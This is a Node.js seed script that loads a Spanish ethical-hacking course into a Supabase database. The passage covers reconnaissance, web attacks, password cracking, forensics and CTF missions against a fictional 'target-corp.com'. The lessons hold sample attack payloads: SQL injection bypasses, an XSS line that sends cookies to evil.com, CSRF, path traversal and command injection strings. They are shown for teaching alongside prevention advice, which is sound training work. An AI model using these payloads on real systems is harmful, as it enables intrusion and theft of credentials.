// ============================================================
// SEED: Curso de Hacking Ético Práctico para ChaskiBots Academy
// Ejecutar: node scripts/seed-hacking-course.js
// ============================================================
const { createClient } = require('@supabase/supabase-js')
const fs = require('fs')
const path = require('path')

const envPath = path.join(__dirname, '..', '.env.local')
if (fs.existsSync(envPath)) {
  fs.readFileSync(envPath, 'utf8').split('\n').forEach(line => {
    const [key, ...vals] = line.split('=')
    if (key && vals.length) process.env[key.trim()] = vals.join('=').trim()
  })
}

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
)

const COURSE = {
  slug: 'hacking',
  title: 'Hacking Ético & Ciberseguridad',
  description: 'Programa práctico de hacking ético: reconocimiento, explotación, criptografía, forense digital y CTF.',
  icon: '🛡️',
  color: '#ef4444',
  is_active: true,
  sort_order: 3,
}

const MODULES = [
  {
    slug: 'reconocimiento',
    title: 'Fase 1: Reconocimiento',
    description: 'La primera fase de todo pentest. Recopila información sin ser detectado.',
    icon: '🔍',
    sort_order: 1,
    lessons: [
      {
        slug: 'osint-basico',
        title: 'OSINT — Inteligencia de Fuentes Abiertas',
        description: 'Aprende a recopilar información pública sobre un objetivo sin tocarlo directamente.',
        difficulty: 'easy',
        estimated_minutes: 15,
        sort_order: 1,
        theory: `# OSINT — Open Source Intelligence

## ¿Qué es OSINT?

**OSINT** es la recopilación de información usando fuentes públicamente accesibles. Es la primera habilidad de todo hacker ético y la base de cualquier investigación.

## Fuentes de información

### Pasivas (no dejas rastro)
- **Whois** → información del dueño de un dominio
- **DNS records** → servidores, subdominios, correos
- **Google Dorks** → búsquedas avanzadas en Google
- **Shodan** → buscador de dispositivos conectados
- **Redes sociales** → perfiles, fotos, metadatos

### Semi-pasivas (dejas poco rastro)
- **nslookup/dig** → consultas DNS
- **theHarvester** → recopilar emails y subdominios
- **Wayback Machine** → versiones antiguas de webs

## Google Dorks — Tu superpoder

Los "dorks" son búsquedas avanzadas en Google:

\`\`\`
site:ejemplo.com           → solo resultados de ese sitio
filetype:pdf               → solo archivos PDF
intitle:"index of"         → directorios expuestos
inurl:admin                → páginas de administración
"password" filetype:txt    → archivos con contraseñas
\`\`\`

## Regla de Oro

En un pentest real, el 60% del trabajo es reconocimiento. Cuanta más información tengas, más fácil será encontrar vulnerabilidades.

## Herramientas profesionales

- **Maltego** → visualización de relaciones
- **SpiderFoot** → automatización de OSINT
- **Recon-ng** → framework de reconocimiento
- **theHarvester** → recopilación de emails/subdominios`,
        examples: [
          { title: 'Consulta Whois', code: 'whois ejemplo.com', explanation: 'Consulta información pública del registro del dominio: dueño, fecha, servidores DNS' },
          { title: 'Resolución DNS', code: 'nslookup ejemplo.com', explanation: 'Resuelve el dominio a su IP y muestra los servidores DNS autoritativos' },
          { title: 'Buscar subdominios', code: 'dig ejemplo.com ANY', explanation: 'Consulta todos los registros DNS del dominio (A, MX, NS, TXT, etc.)' },
          { title: 'Google Dork simulado', code: 'dork site:target.com filetype:pdf', explanation: 'Simula una búsqueda avanzada de Google para encontrar PDFs en el sitio objetivo' },
        ],
        challenges: [
          {
            title: 'Investiga el objetivo',
            description: 'Tu cliente te contrató para hacer un pentest a "target-corp.com". Comienza con reconocimiento pasivo. ¿Qué información puedes obtener?',
            starter_code: 'whois target-corp.com',
            expected_output: 'Registrant',
            hints: ['Empieza con whois para ver quién registró el dominio', 'Luego usa nslookup para ver la IP', 'Finalmente usa dork para buscar archivos expuestos'],
          },
          {
            title: 'Encuentra archivos expuestos',
            description: 'Usa Google Dorks para buscar archivos sensibles en el servidor objetivo.',
            starter_code: 'dork site:target-corp.com filetype:txt password',
            expected_output: 'resultado',
            hints: ['Los Google Dorks combinan operadores de búsqueda', 'filetype: busca por extensión de archivo', 'Combina con palabras clave como "password" o "admin"'],
          },
        ],
      },
      {
        slug: 'escaneo-redes',
        title: 'Escaneo de Redes con Nmap',
        description: 'Domina Nmap, la herramienta más importante de escaneo de redes en el mundo.',
        difficulty: 'medium',
        estimated_minutes: 20,
        sort_order: 2,
        theory: `# Escaneo de Redes con Nmap

## ¿Qué es Nmap?

**Nmap** (Network Mapper) es la herramienta de escaneo de redes más usada por profesionales de ciberseguridad. Fue creada por Gordon Lyon (Fyodor) y aparece en películas como Matrix Reloaded.

## Tipos de escaneo

### TCP Connect Scan (-sT)
El más básico. Completa la conexión TCP (3-way handshake).
- ✅ No requiere privilegios
- ❌ Fácil de detectar

### SYN Scan (-sS) — "Stealth Scan"
Envía SYN pero NO completa la conexión.
- ✅ Más sigiloso
- ❌ Requiere root/sudo

### UDP Scan (-sU)
Escanea puertos UDP (DNS, DHCP, SNMP).
- ⚠️ Mucho más lento que TCP

### Service Version (-sV)
Detecta qué software y versión corre en cada puerto.
- Ejemplo: \`Apache 2.4.41\` en vez de solo \`http\`

## Puertos importantes

| Puerto | Servicio | Riesgo |
|--------|----------|--------|
| 21 | FTP | Archivos sin encriptar |
| 22 | SSH | Fuerza bruta si mal configurado |
| 23 | Telnet | TODO sin encriptar ⚠️ |
| 25 | SMTP | Spoofing de emails |
| 53 | DNS | DNS poisoning |
| 80/443 | HTTP/S | Web attacks (SQLi, XSS) |
| 3306 | MySQL | Acceso a base de datos |
| 3389 | RDP | Control remoto Windows |
| 8080 | Proxy | Acceso alternativo |

## Scripts NSE

Nmap tiene cientos de scripts para detección automática:
\`\`\`
nmap --script vuln 192.168.1.1
nmap --script http-enum 192.168.1.1
\`\`\``,
        examples: [
          { title: 'Escaneo básico', code: 'nmap 192.168.1.1', explanation: 'Escaneo TCP de los 1000 puertos más comunes' },
          { title: 'Escaneo completo', code: 'nmap -sV -sC 10.0.0.5', explanation: 'Detecta versiones de servicios y ejecuta scripts por defecto' },
          { title: 'Escaneo sigiloso', code: 'nmap -sS -T2 192.168.1.0/24', explanation: 'SYN scan a toda la subred con velocidad lenta para evitar detección' },
          { title: 'Detección de vulnerabilidades', code: 'nmap --script vuln 10.0.0.10', explanation: 'Ejecuta scripts de detección de vulnerabilidades conocidas' },
        ],
        challenges: [
          {
            title: 'Mapa de la red',
            description: 'Necesitas descubrir todos los servicios en el servidor 10.0.0.5 con versiones exactas. ¿Qué encuentras?',
            starter_code: 'nmap -sV 10.0.0.5',
            expected_output: 'open',
            hints: ['Usa -sV para detectar versiones', 'Los puertos open son los que aceptan conexiones', 'Identifica servicios como SSH, HTTP, MySQL'],
          },
        ],
      },
      {
        slug: 'enumeracion-servicios',
        title: 'Enumeración de Servicios',
        description: 'Una vez encontrados los servicios, aprende a extraer información detallada de cada uno.',
        difficulty: 'medium',
        estimated_minutes: 18,
        sort_order: 3,
        theory: `# Enumeración de Servicios

## ¿Qué es la enumeración?

Después de descubrir servicios con nmap, la **enumeración** consiste en extraer información detallada: versiones, usuarios, directorios, configuraciones.

## Enumeración Web (HTTP/HTTPS)

### Headers HTTP
Los headers revelan tecnologías usadas:
\`\`\`
curl -I https://target.com
\`\`\`
Busca: \`Server\`, \`X-Powered-By\`, \`X-AspNet-Version\`

### Directorios ocultos
Herramientas como \`dirb\` o \`gobuster\` buscan rutas:
\`\`\`
/admin    /backup    /config
/api      /test      /.git
/uploads  /phpmyadmin
\`\`\`

### robots.txt
Muchos sitios exponen rutas "secretas" en robots.txt

## Enumeración SSH
- Detectar versión: \`ssh -V\`
- Intentar banner grabbing
- Verificar métodos de autenticación

## Enumeración SMB (Windows)
- Listar shares: \`smbclient -L //target\`
- Usuarios: \`enum4linux target\`

## Enumeración DNS
- Transferencia de zona: \`dig axfr @ns.target.com target.com\`
- Fuerza bruta de subdominios

## ¿Por qué importa?

Cada dato es una pieza del puzzle. Una versión de software desactualizada = posible exploit. Un directorio expuesto = acceso no autorizado.`,
        examples: [
          { title: 'Headers del servidor', code: 'curl -I https://target-corp.com', explanation: 'Obtiene los headers HTTP que revelan tecnología del servidor (Apache, nginx, etc.)' },
          { title: 'Buscar robots.txt', code: 'curl https://target-corp.com/robots.txt', explanation: 'robots.txt a menudo revela rutas que el sitio no quiere indexar — posibles secretos' },
          { title: 'Buscar directorios', code: 'dirb https://target-corp.com', explanation: 'Escanea directorios comunes como /admin, /backup, /api, /.git' },
          { title: 'Banner grabbing SSH', code: 'ssh -V target-corp.com', explanation: 'Obtiene la versión exacta del servidor SSH para buscar vulnerabilidades' },
        ],
        challenges: [
          {
            title: 'Encuentra la puerta trasera',
            description: 'El servidor web tiene directorios ocultos. Uno de ellos contiene un panel de administración expuesto. Encuéntralo.',
            starter_code: 'dirb https://target-corp.com',
            expected_output: '/admin',
            hints: ['Usa dirb para escanear directorios comunes', 'Busca rutas como /admin, /panel, /dashboard', 'Los códigos 200 y 301 indican que la ruta existe'],
          },
        ],
      },
    ],
  },
  {
    slug: 'web-hacking',
    title: 'Fase 2: Hacking Web',
    description: 'Las vulnerabilidades web más comunes: SQL Injection, XSS, CSRF y más.',
    icon: '🌐',
    sort_order: 2,
    lessons: [
      {
        slug: 'sql-injection',
        title: 'SQL Injection — El Ataque Clásico',
        description: 'Aprende cómo funciona la inyección SQL, el ataque más devastador contra bases de datos.',
        difficulty: 'medium',
        estimated_minutes: 25,
        sort_order: 1,
        theory: `# SQL Injection (SQLi)

## ¿Qué es?

**SQL Injection** es un ataque donde el atacante inserta código SQL malicioso a través de inputs de un formulario web para manipular la base de datos.

## Ranking OWASP

SQLi está en el **Top 10 de OWASP** (las vulnerabilidades web más críticas). Ha sido responsable de las brechas de datos más grandes de la historia.

## ¿Cómo funciona?

### Login vulnerable
Código del servidor (vulnerable):
\`\`\`sql
SELECT * FROM users
WHERE username = '{input}' AND password = '{input}'
\`\`\`

### El ataque
Si en el campo de usuario escribes:
\`\`\`
' OR 1=1 --
\`\`\`

La consulta se convierte en:
\`\`\`sql
SELECT * FROM users
WHERE username = '' OR 1=1 --' AND password = ''
\`\`\`

\`1=1\` siempre es verdadero y \`--\` comenta el resto. **¡Acceso concedido sin contraseña!**

## Tipos de SQLi

### 1. Union-based
Combina resultados con UNION para extraer datos:
\`\`\`
' UNION SELECT username, password FROM users --
\`\`\`

### 2. Blind SQLi
No ves el resultado directamente, pero puedes inferir:
\`\`\`
' AND 1=1 --  (respuesta normal = verdadero)
' AND 1=2 --  (respuesta diferente = falso)
\`\`\`

### 3. Time-based
Usa delays para confirmar:
\`\`\`
' AND SLEEP(5) --  (si tarda 5 seg = vulnerable)
\`\`\`

## Prevención

- **Prepared Statements** (consultas parametrizadas)
- **ORM** (Object-Relational Mapping)
- **Input validation** y sanitización
- **WAF** (Web Application Firewall)
- **Principio de menor privilegio** en la BD`,
        examples: [
          { title: 'Bypass de login', code: "sqli login admin ' OR 1=1 --", explanation: 'Simula un ataque SQLi al formulario de login. El payload bypasea la autenticación.' },
          { title: 'Extraer tabla de usuarios', code: "sqli union ' UNION SELECT username,password FROM users --", explanation: 'Usa UNION para combinar resultados y extraer credenciales de la base de datos' },
          { title: 'SQLi ciego (Blind)', code: "sqli blind ' AND 1=1 --", explanation: 'Prueba si el servidor es vulnerable comparando respuestas verdadero/falso' },
          { title: 'Detectar con WAF', code: 'waf-test sql "SELECT * FROM users"', explanation: 'Prueba si el WAF (firewall) detecta y bloquea la inyección SQL' },
        ],
        challenges: [
          {
            title: 'Hackea el login',
            description: 'El sitio web de Target Corp tiene un login vulnerable a SQLi. Encuentra la forma de entrar sin conocer la contraseña.',
            starter_code: "sqli login admin ' OR 1=1 --",
            expected_output: 'ACCESO',
            hints: ["El payload clásico es: ' OR 1=1 --", 'La comilla simple cierra el string del username', '1=1 siempre es verdadero', '-- comenta el resto de la query'],
          },
          {
            title: 'Extrae las credenciales',
            description: 'Ya sabes que el login es vulnerable. Ahora extrae los usuarios y contraseñas de la base de datos.',
            starter_code: "sqli union ' UNION SELECT username,password FROM users --",
            expected_output: 'admin',
            hints: ['UNION combina dos consultas SELECT', 'La tabla se llama "users"', 'Las columnas son "username" y "password"'],
          },
        ],
      },
      {
        slug: 'xss-cross-site-scripting',
        title: 'XSS — Cross-Site Scripting',
        description: 'Inyecta scripts en páginas web para robar cookies, redirigir usuarios o desfigurar sitios.',
        difficulty: 'medium',
        estimated_minutes: 20,
        sort_order: 2,
        theory: `# XSS — Cross-Site Scripting

## ¿Qué es?

**XSS** permite inyectar código JavaScript malicioso en páginas web que otros usuarios visitan.

## Impacto

- **Robo de cookies/sesiones** → secuestrar cuentas
- **Keylogging** → capturar contraseñas
- **Phishing** → mostrar formularios falsos
- **Defacement** → modificar el contenido visual
- **Redireccionamiento** → enviar a sitios maliciosos

## Tipos de XSS

### 1. Reflected XSS
El payload se envía en la URL y se refleja en la respuesta:
\`\`\`
https://target.com/search?q=<script>alert('XSS')</script>
\`\`\`

### 2. Stored XSS (Persistente)
El payload se guarda en la base de datos (comentarios, perfiles):
\`\`\`html
<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
\`\`\`
**Más peligroso** porque afecta a todos los visitantes.

### 3. DOM-based XSS
Ocurre en el navegador sin tocar el servidor:
\`\`\`javascript
document.write(location.hash.substring(1))
\`\`\`

## Prevención

- **Escapar output** → convertir < > " ' & a entidades HTML
- **Content Security Policy (CSP)** → restringir scripts permitidos
- **HttpOnly cookies** → impedir acceso desde JavaScript
- **Sanitización de input** → eliminar tags HTML peligrosos
- **Frameworks modernos** → React, Vue escapan automáticamente`,
        examples: [
          { title: 'XSS Reflected', code: 'xss reflected <script>alert("XSS")</script>', explanation: 'Prueba un payload XSS básico — el navegador ejecutaría este alert si es vulnerable' },
          { title: 'Robo de cookies', code: 'xss stored <img src=x onerror="steal(document.cookie)">', explanation: 'Inyecta un tag img que ejecuta JS al fallar la carga — robaría cookies' },
          { title: 'Bypass de filtros', code: 'xss bypass <svg onload=alert(1)>', explanation: 'Si el sitio filtra <script>, prueba otros tags como <svg>, <img>, <iframe>' },
          { title: 'Probar CSP', code: 'csp-check target-corp.com', explanation: 'Verifica si el sitio tiene Content Security Policy configurado' },
        ],
        challenges: [
          {
            title: 'Encuentra el XSS',
            description: 'La página de búsqueda de Target Corp refleja tu input sin sanitizar. Demuestra la vulnerabilidad.',
            starter_code: 'xss reflected <script>alert("Hacked!")</script>',
            expected_output: 'VULNERABLE',
            hints: ['El campo de búsqueda no sanitiza el input', '<script> es el tag más básico para XSS', 'Si ves tu payload reflejado = vulnerable'],
          },
        ],
      },
      {
        slug: 'csrf-y-otros',
        title: 'CSRF, IDOR y más ataques web',
        description: 'Otros ataques web críticos: falsificación de solicitudes, referencias inseguras y más.',
        difficulty: 'hard',
        estimated_minutes: 20,
        sort_order: 3,
        theory: `# Más Ataques Web

## CSRF — Cross-Site Request Forgery

### ¿Cómo funciona?
Engañas al navegador de la víctima para que haga una petición no deseada a un sitio donde está autenticada.

### Ejemplo
Un email con esta imagen oculta:
\`\`\`html
<img src="https://banco.com/transferir?a=atacante&monto=10000">
\`\`\`
Si la víctima tiene sesión activa en el banco, la transferencia se ejecuta.

### Prevención
- **Tokens CSRF** → token único por formulario
- **SameSite cookies** → restringir cookies cross-origin

## IDOR — Insecure Direct Object Reference

### ¿Cómo funciona?
Cambias un ID en la URL para acceder a datos de otros usuarios:
\`\`\`
/api/user/profile?id=123  → tu perfil
/api/user/profile?id=124  → perfil de otro usuario ⚠️
\`\`\`

### Prevención
- Verificar autorización en cada request
- Usar UUIDs en vez de IDs secuenciales

## Path Traversal

Acceder a archivos fuera del directorio web:
\`\`\`
https://target.com/download?file=../../../etc/passwd
\`\`\`

## Command Injection

Similar a SQLi pero inyecta comandos del sistema:
\`\`\`
; cat /etc/passwd
| whoami
\`\`\``,
        examples: [
          { title: 'Simular CSRF', code: 'csrf https://target-corp.com/api/transfer?to=hacker&amount=1000', explanation: 'Simula un ataque CSRF que haría una transferencia si la víctima tiene sesión activa' },
          { title: 'Probar IDOR', code: 'idor /api/user/profile?id=1', explanation: 'Cambia el ID para intentar acceder al perfil de otro usuario' },
          { title: 'Path Traversal', code: 'traversal ../../../etc/passwd', explanation: 'Intenta subir directorios para leer archivos sensibles del servidor' },
          { title: 'Command Injection', code: 'cmdinject "; whoami"', explanation: 'Inyecta un comando del sistema a través de un input vulnerable' },
        ],
        challenges: [
          {
            title: 'Accede a datos ajenos',
            description: 'La API de Target Corp usa IDs numéricos secuenciales. Tu perfil es id=1000. ¿Puedes ver el del administrador (id=1)?',
            starter_code: 'idor /api/user/profile?id=1',
            expected_output: 'admin',
            hints: ['Simplemente cambia el número de ID', 'El administrador generalmente tiene id=1', 'Si funciona, el sitio es vulnerable a IDOR'],
          },
        ],
      },
    ],
  },
  {
    slug: 'criptografia-avanzada',
    title: 'Fase 3: Criptografía',
    description: 'Encriptación, hashing, cracking de contraseñas y protección de datos.',
    icon: '🔑',
    sort_order: 3,
    lessons: [
      {
        slug: 'password-cracking',
        title: 'Cracking de Contraseñas',
        description: 'Entiende cómo los hackers rompen contraseñas y cómo proteger las tuyas.',
        difficulty: 'medium',
        estimated_minutes: 20,
        sort_order: 1,
        theory: `# Cracking de Contraseñas

## ¿Cómo se almacenan?

Las contraseñas NUNCA deben guardarse en texto plano. Se almacenan como **hashes**:

\`\`\`
password → $2b$12$LJ3m4ys3Hg...  (bcrypt hash)
\`\`\`

## Métodos de cracking

### 1. Fuerza bruta
Prueba TODAS las combinaciones posibles:
- 4 caracteres (a-z) = 456,976 combinaciones
- 8 caracteres (a-z,A-Z,0-9) = 218 trillones
- ⏱️ Muy lento para contraseñas largas

### 2. Diccionario
Prueba palabras de una lista (wordlist):
- \`rockyou.txt\` → 14 millones de contraseñas filtradas
- Nombres, fechas, palabras comunes
- ⚡ Mucho más rápido que fuerza bruta

### 3. Rainbow Tables
Tablas precalculadas de hashes → contraseñas:
- Instantáneo pero ocupa mucho espacio
- Se previene con **salt** (dato aleatorio agregado)

### 4. Reglas y mutaciones
Combina diccionario con transformaciones:
- password → P@ssw0rd, Password1, p@$$word
- Agrega años: admin2024, admin2023

## Herramientas profesionales

- **John the Ripper** → offline, múltiples formatos
- **Hashcat** → GPU-accelerated, muy rápido
- **Hydra** → online, fuerza bruta contra servicios

## Protección

- Contraseñas de 12+ caracteres con mezcla
- **bcrypt** con salt (no MD5 ni SHA1)
- Autenticación de 2 factores (2FA)
- Rate limiting en login`,
        examples: [
          { title: 'Verificar fortaleza', code: 'passcheck P@ssw0rd123!', explanation: 'Analiza la fortaleza de una contraseña y estima tiempo de cracking' },
          { title: 'Ataque de diccionario', code: 'crack-dict admin 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', explanation: 'Intenta crackear un hash SHA1 usando un diccionario de contraseñas comunes' },
          { title: 'Generar hash', code: 'hash-password MiContraseña123', explanation: 'Genera diferentes hashes (MD5, SHA1, SHA256) de una contraseña' },
          { title: 'Fuerza bruta simulada', code: 'brute-force 4', explanation: 'Simula un ataque de fuerza bruta contra una contraseña de 4 caracteres' },
        ],
        challenges: [
          {
            title: 'Crackea el hash',
            description: 'Encontraste este hash en la base de datos filtrada: 5baa61e4... ¿Puedes descubrir la contraseña original usando diccionario?',
            starter_code: 'crack-dict admin 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8',
            expected_output: 'password',
            hints: ['Es un hash SHA1', 'Usa el ataque de diccionario', 'La contraseña es una de las más comunes del mundo'],
          },
        ],
      },
      {
        slug: 'cifrados-modernos',
        title: 'Cifrados Modernos: AES, RSA, PKI',
        description: 'Los algoritmos que protegen internet: encriptación simétrica, asimétrica y certificados.',
        difficulty: 'hard',
        estimated_minutes: 20,
        sort_order: 2,
        theory: `# Cifrados Modernos

## Simétrico vs Asimétrico

### Cifrado Simétrico (AES)
- **Una clave** para encriptar y desencriptar
- Rápido y eficiente
- Problema: ¿cómo compartes la clave de forma segura?
- **AES-256** es el estándar actual (usado por gobiernos)

### Cifrado Asimétrico (RSA)
- **Dos claves**: pública (encriptar) + privada (desencriptar)
- Más lento pero soluciona el problema de compartir claves
- Base de HTTPS, SSH, firmas digitales

## ¿Cómo funciona HTTPS?

1. Tu navegador pide el **certificado** del servidor
2. Verifica que sea válido (firmado por una CA)
3. Usa la **clave pública** del servidor para encriptar una clave simétrica
4. Ambos usan esa clave simétrica (AES) para el resto de la comunicación

Este proceso se llama **TLS Handshake**.

## PKI — Public Key Infrastructure

Infraestructura de confianza que hace que HTTPS funcione:
- **CA** (Certificate Authority) → firma certificados
- **Certificados** → prueban identidad del servidor
- **CRL/OCSP** → verifican si un certificado fue revocado

## Algoritmos importantes

| Algoritmo | Tipo | Uso |
|-----------|------|-----|
| AES-256 | Simétrico | Datos en reposo y tránsito |
| RSA-2048 | Asimétrico | Intercambio de claves |
| ECDSA | Asimétrico | Firmas digitales |
| SHA-256 | Hash | Integridad de datos |
| bcrypt | Hash | Contraseñas |`,
        examples: [
          { title: 'Encriptar con AES', code: 'aes-encrypt "mensaje secreto" clave123', explanation: 'Encripta un mensaje usando AES (simulado) con una clave simétrica' },
          { title: 'Verificar certificado SSL', code: 'ssl-check target-corp.com', explanation: 'Verifica el certificado SSL/TLS del servidor: emisor, expiración, algoritmo' },
          { title: 'Generar par de claves', code: 'keygen rsa 2048', explanation: 'Genera un par de claves RSA (pública + privada) de 2048 bits' },
          { title: 'Cifrado César vs AES', code: 'encrypt hola 3', explanation: 'El cifrado César es educativo pero débil — compara con AES real' },
        ],
        challenges: [
          {
            title: 'Verifica la seguridad HTTPS',
            description: 'Analiza el certificado SSL de target-corp.com. ¿Es seguro? ¿Cuándo expira? ¿Qué algoritmo usa?',
            starter_code: 'ssl-check target-corp.com',
            expected_output: 'TLS',
            hints: ['ssl-check muestra detalles del certificado', 'Busca la versión de TLS (1.2 o 1.3 es seguro)', 'Verifica que no haya expirado'],
          },
        ],
      },
    ],
  },
  {
    slug: 'forense-digital',
    title: 'Fase 4: Forense Digital',
    description: 'Análisis de logs, investigación de incidentes y rastreo de atacantes.',
    icon: '🔬',
    sort_order: 4,
    lessons: [
      {
        slug: 'analisis-logs',
        title: 'Análisis Forense de Logs',
        description: 'Aprende a leer logs del sistema para detectar intrusiones y rastrear atacantes.',
        difficulty: 'medium',
        estimated_minutes: 20,
        sort_order: 1,
        theory: `# Análisis Forense de Logs

## ¿Qué es la forense digital?

La **forense digital** investiga incidentes de seguridad analizando evidencia digital: logs, archivos, memoria, tráfico de red.

## Logs críticos en Linux

### /var/log/auth.log
Registra intentos de autenticación:
\`\`\`
Failed password for root from 10.0.0.99 port 22
Accepted publickey for admin from 192.168.1.50
\`\`\`

### /var/log/syslog
Eventos generales del sistema:
\`\`\`
Started Apache Web Server
Stopped firewall service ⚠️
\`\`\`

### /var/log/access.log (Apache/Nginx)
Peticiones web:
\`\`\`
10.0.0.99 "GET /admin HTTP/1.1" 200
10.0.0.99 "POST /login HTTP/1.1" 401
\`\`\`

## Patrones de ataque

### Fuerza bruta
Múltiples \`Failed password\` desde la misma IP en poco tiempo.

### Escalación de privilegios
Uso sospechoso de \`sudo\` o acceso a archivos de root.

### Web Shell
Peticiones POST a archivos .php en directorios inusuales.

### Data Exfiltration
Transferencias grandes de datos a IPs desconocidas.

## Metodología de investigación

1. **Preservar** → no modificar la evidencia
2. **Recolectar** → copiar logs relevantes
3. **Analizar** → buscar patrones y anomalías
4. **Correlacionar** → conectar eventos entre diferentes logs
5. **Reportar** → documentar hallazgos`,
        examples: [
          { title: 'Detectar fuerza bruta', code: 'grep Failed /var/log/auth.log', explanation: 'Busca intentos de login fallidos — múltiples desde la misma IP = fuerza bruta' },
          { title: 'Peticiones sospechosas', code: 'grep 403 /var/log/access.log', explanation: 'Los códigos 403 (Forbidden) indican intentos de acceder a recursos protegidos' },
          { title: 'Analizar atacantes', code: 'forensics auth-analysis', explanation: 'Análisis automatizado de auth.log: IPs atacantes, frecuencia, métodos' },
          { title: 'Timeline del incidente', code: 'forensics timeline', explanation: 'Reconstruye la cronología del ataque correlacionando múltiples logs' },
        ],
        challenges: [
          {
            title: 'Investiga el incidente',
            description: 'El SIEM detectó actividad sospechosa. Analiza los logs de autenticación y determina: ¿Qué IP está atacando? ¿Cuántos intentos hizo?',
            starter_code: 'forensics auth-analysis',
            expected_output: '10.0.0.99',
            hints: ['Busca "Failed" en auth.log', 'La IP que más intentos tiene es la atacante', 'Compara con accesos exitosos para ver si logró entrar'],
          },
        ],
      },
      {
        slug: 'respuesta-incidentes',
        title: 'Respuesta a Incidentes',
        description: 'Qué hacer cuando detectas un ataque: contener, erradicar y recuperar.',
        difficulty: 'hard',
        estimated_minutes: 18,
        sort_order: 2,
        theory: `# Respuesta a Incidentes

## Framework NIST

El NIST define 4 fases de respuesta a incidentes:

### 1. Preparación
- Tener un plan de respuesta documentado
- Herramientas forenses listas
- Backups actualizados
- Equipo de respuesta entrenado

### 2. Detección y Análisis
- Monitorear alertas (SIEM, IDS, antivirus)
- Clasificar la severidad
- Determinar el alcance del compromiso
- Documentar todo desde el inicio

### 3. Contención, Erradicación y Recuperación
- **Contener** → aislar sistemas comprometidos
- **Erradicar** → eliminar el malware/acceso del atacante
- **Recuperar** → restaurar desde backups limpios

### 4. Actividades Post-Incidente
- Análisis de causa raíz
- Lecciones aprendidas
- Actualizar procedimientos
- Reportar a autoridades si es necesario

## Comandos de respuesta

\`\`\`bash
# Aislar la máquina
iptables -A INPUT -s ATTACKER_IP -j DROP

# Ver procesos sospechosos
ps aux | grep suspicious

# Verificar archivos modificados recientemente
find / -mmin -60 -type f

# Capturar estado de red
netstat -tulnp
\`\`\`

## Indicadores de Compromiso (IoC)

- IPs maliciosas
- Hashes de malware
- Dominios de C2 (Command & Control)
- Patrones de tráfico anormales
- Archivos modificados`,
        examples: [
          { title: 'Bloquear atacante', code: 'iptables -A INPUT -s 10.0.0.99 -j DROP', explanation: 'Bloquea todo el tráfico entrante desde la IP del atacante' },
          { title: 'Procesos sospechosos', code: 'ps', explanation: 'Lista todos los procesos corriendo — busca nombres inusuales' },
          { title: 'Archivos recientes', code: 'find / -mmin -60', explanation: 'Encuentra archivos modificados en la última hora — posible actividad maliciosa' },
          { title: 'Verificar conexiones', code: 'netstat', explanation: 'Muestra conexiones activas — busca IPs desconocidas en estado ESTABLISHED' },
        ],
        challenges: [
          {
            title: 'Contén el ataque',
            description: 'Has confirmado que la IP 10.0.0.99 está atacando tu servidor. El primer paso es contener. ¡Bloquéala!',
            starter_code: 'iptables -A INPUT -s 10.0.0.99 -j DROP',
            expected_output: 'BLOQUEADA',
            hints: ['iptables es el firewall de Linux', '-A INPUT agrega una regla de entrada', '-s especifica la IP origen', '-j DROP descarta los paquetes'],
          },
        ],
      },
    ],
  },
  {
    slug: 'ctf-misiones',
    title: 'Misiones CTF',
    description: 'Capture The Flag — Misiones prácticas que combinan todo lo aprendido.',
    icon: '🏴',
    sort_order: 5,
    lessons: [
      {
        slug: 'ctf-mision-1',
        title: 'CTF #1: Infiltración en Target Corp',
        description: 'Misión completa: reconocimiento → escaneo → explotación → captura de flag.',
        difficulty: 'medium',
        estimated_minutes: 30,
        sort_order: 1,
        theory: `# CTF #1: Infiltración en Target Corp

## Briefing de la Misión

Tu cliente, **Target Corporation**, te ha contratado para realizar un test de penetración autorizado a su infraestructura.

## Objetivo

Encontrar y capturar la **FLAG** oculta en su servidor interno.

## Reglas de Engagement

1. ✅ Solo los sistemas listados están autorizados
2. ✅ Puedes usar cualquier técnica de las aprendidas
3. ❌ No causar daño a los sistemas
4. 📝 Documenta cada paso

## Infraestructura del objetivo

- **Web Server**: 10.0.0.10 (nginx)
- **Database**: 10.0.0.5 (MySQL)
- **SSH Server**: 192.168.1.1 (OpenSSH)

## Metodología sugerida

1. **Reconocimiento** → whois, nslookup, dork
2. **Escaneo** → nmap para descubrir servicios
3. **Enumeración** → dirb, curl para detalles
4. **Explotación** → SQLi, XSS o acceso SSH
5. **Post-explotación** → escalar privilegios, encontrar la flag

## ¡Buena suerte, hacker! 🎯

Recuerda: cada comando cuenta. La flag tiene el formato:
\`FLAG{texto_aquí}\``,
        examples: [
          { title: 'Paso 1: Reconocimiento', code: 'whois target-corp.com', explanation: '¿Quién es el dueño? ¿Cuándo se registró? ¿Qué servidores DNS usa?' },
          { title: 'Paso 2: Escaneo', code: 'nmap -sV 10.0.0.10', explanation: 'Descubre qué servicios están corriendo y sus versiones exactas' },
          { title: 'Paso 3: Enumeración', code: 'dirb https://target-corp.com', explanation: 'Busca directorios ocultos como /admin, /backup, /.git' },
          { title: 'Paso 4: Explotar', code: "sqli login admin ' OR 1=1 --", explanation: 'Intenta bypass de autenticación con SQL injection' },
          { title: 'Paso 5: Escalar', code: 'sudo cat /root/flag.txt', explanation: 'Con acceso al sistema, busca la flag en /root/' },
        ],
        challenges: [
          {
            title: 'Captura la FLAG',
            description: 'Sigue la metodología de pentesting para encontrar la flag. Empieza con reconocimiento y termina con la captura.',
            starter_code: 'nmap -sV 10.0.0.10',
            expected_output: 'open',
            hints: ['Empieza con nmap para ver qué servicios hay', 'Luego usa dirb para buscar directorios', 'Prueba SQLi en el login', 'La flag está en /root/flag.txt'],
          },
        ],
      },
      {
        slug: 'ctf-mision-2',
        title: 'CTF #2: Forense — Quién Hackeó el Servidor',
        description: 'Investiga un incidente de seguridad real. Analiza logs y descubre al atacante.',
        difficulty: 'hard',
        estimated_minutes: 25,
        sort_order: 2,
        theory: `# CTF #2: Forense — Quién Hackeó el Servidor

## Briefing

El servidor de Target Corp fue comprometido durante la noche. Tu trabajo como analista forense es:

1. Determinar **cómo** entraron
2. Identificar **qué** hicieron
3. Descubrir **quién** fue (IP/origen)
4. Documentar la **línea temporal**

## Evidencia disponible

- Logs de autenticación: \`/var/log/auth.log\`
- Logs del servidor web: \`/var/log/access.log\`
- Logs de errores: \`/var/log/error.log\`
- Logs del sistema: \`/var/log/syslog\`

## Indicadores sospechosos conocidos

